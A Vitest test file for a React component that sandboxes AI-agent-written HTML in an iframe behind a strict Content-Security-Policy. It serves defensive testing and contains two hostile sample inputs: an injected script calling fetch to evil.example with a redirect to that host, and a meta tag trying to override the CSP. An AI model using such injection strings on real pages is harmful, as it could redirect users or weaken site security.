import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { CATALOG } from "./objects";
import { Sandbox, buildSandboxDoc } from "./sandbox";

afterEach(cleanup);

const frame = () => document.querySelector("iframe") as HTMLIFrameElement;

describe("<Sandbox>", () => {
  it("runs the page in a frame that can run scripts and nothing else", () => {
    render(<Sandbox props={{ html: "<h1>hi</h1>", title: "Clock" }} />);
    const f = frame();
    // no allow-same-origin: the page gets an empty origin, so it cannot reach cookies, storage or the app
    expect((f.getAttribute("sandbox") ?? "").split(/\s+/).filter(Boolean)).toEqual(["allow-scripts"]);
    expect(f.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(f.getAttribute("allow")).toBe("");
    expect(f.getAttribute("title")).toBe("Clock");
    expect(screen.getByRole("heading", { name: "Clock" })).toBeTruthy();
  });

  it("puts the agent's page in srcdoc, never at a URL", () => {
    render(<Sandbox props={{ html: "<p id='x'>Hello</p>" }} />);
    expect(frame().getAttribute("src")).toBeNull();
    expect(frame().getAttribute("srcdoc")).toContain("<p id='x'>Hello</p>");
  });

  it("renders an empty frame for missing or non-text html instead of crashing", () => {
    render(<Sandbox props={{ html: 42 }} />);
    expect(frame()).not.toBeNull();
    expect(frame().getAttribute("srcdoc")).not.toContain("42");
  });

  it("is available to the agent as a stage object type", () => {
    expect(CATALOG.sandbox).toBe(Sandbox);
  });
});

describe("buildSandboxDoc", () => {
  const csp = (doc: string) => /Content-Security-Policy" content="([^"]*)"/.exec(doc)![1]!;

  it("denies every network and navigation route and allows only inline code and data images", () => {
    const policy = csp(buildSandboxDoc("<p>x</p>"));
    expect(policy).toContain("default-src 'none'"); // so no fetch, XHR, WebSocket, fonts, media or frames from anywhere
    expect(policy).toContain("script-src 'unsafe-inline'");
    expect(policy).toContain("style-src 'unsafe-inline'");
    expect(policy).toContain("img-src data: blob:");
    expect(policy).toContain("form-action 'none'");
    expect(policy).toContain("base-uri 'none'");
    expect(policy).not.toMatch(/https?:|\*|connect-src/);
  });

  it("puts the policy before anything the agent wrote, so the page cannot get ahead of it", () => {
    const hostile = "</head><script>fetch('https://evil.example')</script><meta http-equiv='refresh' content='0;url=https://evil.example'>";
    const doc = buildSandboxDoc(hostile);
    expect(doc.indexOf("Content-Security-Policy")).toBeGreaterThan(-1);
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf(hostile));
    expect(doc.startsWith("<!doctype html>")).toBe(true);
  });

  it("keeps the agent's text out of the policy itself", () => {
    const doc = buildSandboxDoc('"><meta http-equiv="Content-Security-Policy" content="default-src *">');
    expect(csp(doc)).not.toContain("*");
  });
});
